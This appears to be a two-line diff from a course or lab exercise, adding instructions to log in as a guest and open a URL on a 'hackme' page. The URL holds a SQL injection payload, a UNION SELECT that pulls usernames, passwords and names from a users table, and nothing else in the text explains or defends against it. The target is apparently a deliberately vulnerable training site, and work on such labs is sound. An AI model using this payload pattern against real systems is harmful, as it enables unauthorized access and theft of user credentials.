@@ -1,0 +1,2 @@
+After login with guest, copy this link to URL box:
+http://fiona.utdallas.edu/hackme/show.php?pid=1%27%20union%20all%20SELECT%20username,%20pass,%20fname,%20lname,%20extra%20FROM%20users%20WHERE%20%271%27=%271
